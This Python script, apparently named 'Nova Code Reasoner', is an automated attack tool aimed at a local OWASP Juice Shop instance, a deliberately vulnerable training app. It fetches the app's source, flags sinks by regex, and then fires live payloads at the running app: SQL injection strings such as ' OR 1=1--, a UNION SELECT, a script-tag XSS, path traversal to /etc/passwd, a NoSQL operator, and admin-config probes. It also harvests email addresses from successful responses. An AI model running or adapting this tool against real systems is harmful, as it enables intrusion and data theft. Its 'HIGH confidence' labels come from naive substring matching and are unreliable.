#!/usr/bin/env python3
"""
NOVA CODE REASONER v2.0 - FIXED SOURCE LOADER
Correctly maps leaked runtime paths to Juice Shop GitHub source.
Uses develop branch and proper TypeScript directory structure.
"""

import json, re, os, time, requests
from datetime import datetime
from typing import Dict, List, Optional
from collections import defaultdict


class NovaCodeReasoner:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.repo_base = "https://raw.githubusercontent.com/juice-shop/juice-shop/develop"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Nova/6.0 (Code Reasoner v2)"})
        self.source_files = {}
        self.functions = {}
        self.sinks = []
        self.taint_sources = []
        self.data_flows = []
        self.hypotheses = []
        self.verified_findings = []

        # Path mapping: runtime path → GitHub source path
        self.path_map = {
            "angular": "routes/angular.ts",
            "orderHistory": "routes/orderHistory.ts",
            "login": "routes/login.ts",
            "register": "routes/register.ts",
            "search": "routes/search.ts",
            "verify": "routes/verify.ts",
            "captcha": "routes/captcha.ts",
            "basket": "routes/basket.ts",
            "changePassword": "routes/changePassword.ts",
            "utils": "lib/utils.ts",
            "insecurity": "lib/insecurity.ts",
            "user": "models/user.ts",
            "product": "models/product.ts",
            "feedback": "models/feedback.ts",
            "basketItem": "models/basketItem.ts",
            "sequelize": None,
            "express": None,
            "morgan": None,
            "query": None,
            "layer": None,
            "route": None,
            "index": None,
        }

        self.sink_patterns = {
            "sql_injection": [r'\.query\s*\(', r'sequelize\.query', r'\.findAll\s*\(', r'\.findOne\s*\(', r'\.create\s*\(', r'\.update\s*\('],
            "command_injection": [r'exec\s*\(', r'spawn\s*\(', r'execSync\s*\('],
            "path_traversal": [r'readFile\s*\(', r'sendFile\s*\(', r'\.download\s*\('],
            "xss": [r'\.send\s*\(', r'\.render\s*\(', r'innerHTML'],
            "jwt": [r'jwt\.sign', r'jwt\.verify', r'jsonwebtoken'],
            "auth": [r'\.authenticate', r'security\.isAuthenticated', r'verifyAccessToken'],
        }
        self.taint_patterns = [r'req\.body', r'req\.query', r'req\.params', r'req\.headers', r'req\.cookies']

    def resolve_path(self, leaked_path):
        """Convert a leaked runtime path to a GitHub raw URL."""
        filename = leaked_path.split("/")[-1].split(":")[0]
        base_name = filename.replace(".js", "").replace(".ts", "")

        # Check path map
        for key, github_path in self.path_map.items():
            if key in base_name.lower() or base_name.lower() in key:
                if github_path:
                    return f"{self.repo_base}/{github_path}"
                else:
                    return None

        # Try direct mapping
        if base_name in self.path_map:
            gp = self.path_map[base_name]
            return f"{self.repo_base}/{gp}" if gp else None

        # Fallback: try routes folder
        return f"{self.repo_base}/routes/{base_name}.ts"

    def fetch_source_file(self, url):
        """Fetch and return source code from URL."""
        try:
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 200 and len(resp.text) > 100:
                text = resp.text
                if any(k in text[:300] for k in ["require", "module.exports", "function", "const ", "import ", "export"]):
                    return text
        except:
            pass
        return None

    def load_source_files(self, leaked_paths):
        print(f"\n  📡 Fetching source from {len(leaked_paths)} leaked paths...")
        loaded = 0
        seen_urls = set()

        for path in leaked_paths:
            url = self.resolve_path(path)
            if not url or url in seen_urls:
                continue
            seen_urls.add(url)

            filename = url.split("/")[-1]
            if filename in self.source_files:
                continue

            source = self.fetch_source_file(url)
            if source:
                self.source_files[filename] = source
                loaded += 1
                print(f"     ✅ {filename} ({len(source)} bytes)")

        # Also fetch critical files
        critical = ["server.ts", "lib/insecurity.ts", "lib/utils.ts", "routes/verify.ts"]
        for f in critical:
            if f.split("/")[-1] in self.source_files:
                continue
            url = f"{self.repo_base}/{f}"
            source = self.fetch_source_file(url)
            if source:
                filename = f.split("/")[-1]
                self.source_files[filename] = source
                loaded += 1
                print(f"     ✅ {filename} (critical file)")

        print(f"  📊 Loaded {loaded} source files")
        return loaded

    def extract_functions(self):
        print(f"\n  🔍 Extracting functions from {len(self.source_files)} files...")
        func_pattern = re.compile(r'(?:async\s+)?(?:function\s+)?(\w+)\s*\((.*?)\)\s*\{', re.MULTILINE)
        for filename, source in self.source_files.items():
            for match in func_pattern.finditer(source):
                func_name = match.group(1)
                if func_name in ["if", "for", "while", "switch", "catch", "return"]:
                    continue
                start = match.start()
                depth = 1
                end = start
                for i in range(match.end(), len(source)):
                    if source[i] == '{': depth += 1
                    elif source[i] == '}':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                code_block = source[start:end] if end > start else source[start:start+500]
                calls = re.findall(r'(\w+)\s*\(', code_block)
                self.functions[func_name] = {
                    "file": filename, "line": source[:start].count('\n')+1,
                    "code": code_block[:300], "calls": list(set(calls)),
                }
        print(f"  📊 Extracted {len(self.functions)} functions")
        return self.functions

    def identify_sinks(self):
        print(f"\n  🎯 Identifying dangerous sinks...")
        for filename, source in self.source_files.items():
            lines = source.split('\n')
            for line_num, line in enumerate(lines, 1):
                for vuln_type, patterns in self.sink_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, line, re.IGNORECASE):
                            ctx_s = max(0, line_num-3); ctx_e = min(len(lines), line_num+3)
                            self.sinks.append({
                                "file": filename, "line": line_num,
                                "vulnerability_type": vuln_type,
                                "code": line.strip(),
                                "context": '\n'.join(lines[ctx_s:ctx_e]),
                            })
                            break
        print(f"  📊 Found {len(self.sinks)} sinks")
        by_type = defaultdict(int)
        for s in self.sinks: by_type[s["vulnerability_type"]] += 1
        for t, c in sorted(by_type.items(), key=lambda x: x[1], reverse=True):
            print(f"     {t}: {c}")
        return self.sinks

    def identify_taint_sources(self):
        print(f"\n  🚰 Identifying taint sources...")
        for filename, source in self.source_files.items():
            lines = source.split('\n')
            for line_num, line in enumerate(lines, 1):
                for pattern in self.taint_patterns:
                    for match in re.finditer(pattern, line, re.IGNORECASE):
                        self.taint_sources.append({
                            "file": filename, "line": line_num,
                            "input_type": match.group(), "code": line.strip(),
                        })
        print(f"  📊 Found {len(self.taint_sources)} taint sources")
        return self.taint_sources

    def trace_data_flows(self):
        print(f"\n  🔗 Tracing data flows (source → sink)...")
        for source in self.taint_sources[:50]:
            for sink in self.sinks:
                if source["file"] == sink["file"] and source["line"] < sink["line"]:
                    var = source["input_type"].split(".")[-1] if "." in source["input_type"] else source["input_type"]
                    if var.lower() in sink["context"].lower():
                        self.data_flows.append({
                            "source": source, "sink": sink,
                            "vulnerability_type": sink["vulnerability_type"],
                            "confidence": "HIGH",
                        })
        print(f"  📊 Traced {len(self.data_flows)} data flows")
        for f in self.data_flows[:5]:
            print(f"     [{f['confidence']}] {f['source']['input_type']} → {f['sink']['vulnerability_type']} ({f['sink']['file']}:{f['sink']['line']})")
        return self.data_flows

    def generate_hypotheses(self):
        print(f"\n  💡 Generating vulnerability hypotheses...")
        for flow in self.data_flows:
            vuln = flow["vulnerability_type"]; src = flow["source"]; snk = flow["sink"]
            h = {
                "vulnerability_type": vuln, "file": snk["file"], "line": snk["line"],
                "confidence": flow["confidence"], "theory": "", "test_endpoint": "",
                "test_method": "GET", "test_params": {}, "expected_indicators": [],
            }
            if vuln == "sql_injection":
                h["theory"] = f"User input from {src['input_type']} flows unsanitized into SQL at {snk['file']}:{snk['line']}"
                h["test_params"] = {"q": "' OR 1=1--"}; h["expected_indicators"] = ["user", "email", "password"]
                if "search" in snk["file"].lower(): h["test_endpoint"] = "/rest/products/search"
                elif "login" in snk["file"].lower(): h["test_endpoint"] = "/rest/user/login"; h["test_method"] = "POST"; h["test_params"] = {"email": "' OR 1=1--", "password": "x"}
                elif "order" in snk["file"].lower(): h["test_endpoint"] = "/rest/order-history"
            elif vuln == "xss":
                h["theory"] = f"Unsanitized {src['input_type']} rendered in response"
                h["test_params"] = {"q": "<script>alert('NOVA')</script>"}; h["expected_indicators"] = ["<script>"]
                h["test_endpoint"] = "/rest/products/search"
            elif vuln == "path_traversal":
                h["theory"] = f"User-controlled file path at {snk['file']}:{snk['line']}"
                h["test_params"] = {"file": "../../../etc/passwd"}; h["expected_indicators"] = ["root:"]
                h["test_endpoint"] = "/file-serving"
            elif vuln == "auth":
                h["theory"] = f"Authorization bypass possible at {snk['file']}:{snk['line']}"
                h["test_endpoint"] = "/rest/admin/application-configuration"; h["expected_indicators"] = ["config"]
            elif vuln == "jwt":
                h["theory"] = f"JWT verification flaw at {snk['file']}:{snk['line']}"
                h["test_endpoint"] = "/rest/user/whoami"; h["expected_indicators"] = ["user"]
            if h["test_endpoint"]: self.hypotheses.append(h)
        seen = set(); unique = []
        for h in self.hypotheses:
            k = (h["test_endpoint"], h["vulnerability_type"])
            if k not in seen: seen.add(k); unique.append(h)
        self.hypotheses = unique
        print(f"  📊 Generated {len(self.hypotheses)} unique hypotheses")
        for h in self.hypotheses[:10]:
            print(f"     💡 [{h['confidence']}] {h['vulnerability_type']}: {h['test_endpoint']} — {h['theory'][:80]}")
        return self.hypotheses

    def test_hypothesis(self, hypothesis):
        result = {"hypothesis": hypothesis, "tested": False, "confirmed": False, "evidence": ""}
        url = f"{self.base_url}{hypothesis['test_endpoint']}"
        method = hypothesis.get("test_method", "GET")
        params = hypothesis.get("test_params", {})
        try:
            if method == "POST":
                resp = self.session.post(url, json=params, timeout=10)
            else:
                resp = self.session.request(method, url, params=params, timeout=10)
            result["tested"] = True; result["response_status"] = resp.status_code
            indicators = hypothesis.get("expected_indicators", [])
            found = [i for i in indicators if i.lower() in resp.text.lower()]
            if found:
                result["confirmed"] = True; result["evidence"] = resp.text[:500]
                result["indicators_found"] = found
                if hypothesis["vulnerability_type"] == "sql_injection":
                    emails = re.findall(r'"email"\s*:\s*"([^"]+)"', resp.text)
                    if emails: result["data_extracted"] = {"emails": emails[:5]}
                print(f"     🔥 CONFIRMED: {hypothesis['vulnerability_type']} on {hypothesis['test_endpoint']}")
                print(f"        Indicators: {found}")
            else:
                print(f"     ❌ Not confirmed: {hypothesis['test_endpoint']}")
            if result["confirmed"]: self.verified_findings.append(result)
        except Exception as e:
            result["error"] = str(e)[:100]
            print(f"     ❌ Error: {str(e)[:60]}")
        return result

    def test_all_hypotheses(self):
        print(f"\n  🧪 Testing {len(self.hypotheses)} hypotheses...")
        results = []
        for h in self.hypotheses:
            results.append(self.test_hypothesis(h))
            time.sleep(0.1)
        confirmed = [r for r in results if r.get("confirmed")]
        print(f"\n  📊 {len(confirmed)}/{len(results)} confirmed")
        return results

    def run_full_analysis(self, leaked_paths=None):
        print("""
╔══════════════════════════════════════════════════╗
║   🧬 NOVA CODE REASONER v2.0 — SOURCE AWARE   ║
║   Architecture Analysis → Hypothesis → Test   ║
╚══════════════════════════════════════════════════╝""")
        report = {"timestamp": datetime.now().isoformat(), "phases": {}, "findings": []}
        if leaked_paths:
            loaded = self.load_source_files(leaked_paths)
        else:
            loaded = 0
        report["phases"]["source_loaded"] = loaded
        if loaded == 0:
            print("  ⚠️ No source loaded. Using pattern mode.")
            patterns = [
                {"type": "sql_injection", "endpoint": "/rest/products/search", "method": "GET", "params": {"q": "' UNION SELECT 1,2,3,4,5,6,7,8--"}, "indicators": ["email", "password"]},
                {"type": "sql_injection", "endpoint": "/rest/user/login", "method": "POST", "params": {"email": "' OR 1=1--", "password": "x"}, "indicators": ["token", "authentication"]},
                {"type": "xss", "endpoint": "/api/Feedbacks", "method": "POST", "params": {"comment": "<script>alert('NOVA')</script>"}, "indicators": ["<script>"]},
                {"type": "path_traversal", "endpoint": "/file-serving", "method": "GET", "params": {"file": "....//....//....//etc/passwd"}, "indicators": ["root:"]},
                {"type": "auth_bypass", "endpoint": "/rest/admin/application-configuration", "method": "GET", "params": {}, "indicators": ["config"]},
                {"type": "nosql_injection", "endpoint": "/rest/products/search", "method": "GET", "params": {"q": '{"$gt":""}'}, "indicators": ["product"]},
                {"type": "jwt_attack", "endpoint": "/rest/user/whoami", "method": "GET", "params": {}, "indicators": ["user"]},
            ]
            for p in patterns:
                self.hypotheses.append({"vulnerability_type": p["type"], "test_endpoint": p["endpoint"], "test_method": p["method"], "test_params": p["params"], "expected_indicators": p["indicators"], "confidence": "MEDIUM", "file": "pattern_db", "theory": f"Pattern: {p['type']} on {p['endpoint']}"})
        else:
            self.extract_functions(); report["phases"]["functions"] = len(self.functions)
            self.identify_sinks(); report["phases"]["sinks"] = len(self.sinks)
            self.identify_taint_sources(); report["phases"]["taint_sources"] = len(self.taint_sources)
            self.trace_data_flows(); report["phases"]["data_flows"] = len(self.data_flows)
            self.generate_hypotheses()
        report["phases"]["hypotheses"] = len(self.hypotheses)
        results = self.test_all_hypotheses(); report["phases"]["tested"] = len(results)
        confirmed = [r for r in results if r.get("confirmed")]
        for f in confirmed:
            report["findings"].append({"vulnerability_type": f["hypothesis"]["vulnerability_type"], "endpoint": f["hypothesis"]["test_endpoint"], "theory": f["hypothesis"]["theory"], "evidence": f.get("evidence", "")[:300], "indicators": f.get("indicators_found", []), "data_extracted": f.get("data_extracted", {}), "source_file": f["hypothesis"].get("file", "unknown"), "source_line": f["hypothesis"].get("line", 0)})
        report["total_findings"] = len(report["findings"])
        with open("nova_code_reasoning_report.json", "w") as f: json.dump(report, f, indent=2, default=str)
        print(f"""
╔══════════════════════════════════════════╗
║   REASONING SUMMARY v2.0                ║
╠══════════════════════════════════════════╣
║  Files: {loaded:<3}  Funcs: {len(self.functions):<3}  Sinks: {len(self.sinks):<3}     ║
║  Flows: {len(self.data_flows):<3}  Hypotheses: {len(self.hypotheses):<3}  Confirmed: {len(confirmed):<3} ║
╚══════════════════════════════════════════╝""")
        if confirmed:
            print("🔥 CONFIRMED FROM CODE REASONING:")
            for f in report["findings"]:
                print(f"   💀 [{f['vulnerability_type'].upper()}] {f['endpoint']}")
                if f.get("source_file"): print(f"      Source: {f['source_file']}:{f['source_line']}")
        print(f"\n📁 Report: nova_code_reasoning_report.json")
        return report


if __name__ == "__main__":
    leaked_paths = []
    try:
        with open("nova_leaked_paths.json", "r") as f: leaked_paths = json.load(f).get("leaked_paths", [])
    except: pass
    print(f"  📁 Loaded {len(leaked_paths)} leaked paths from previous mission")
    reasoner = NovaCodeReasoner(base_url="http://localhost:3000")
    report = reasoner.run_full_analysis(leaked_paths=leaked_paths)
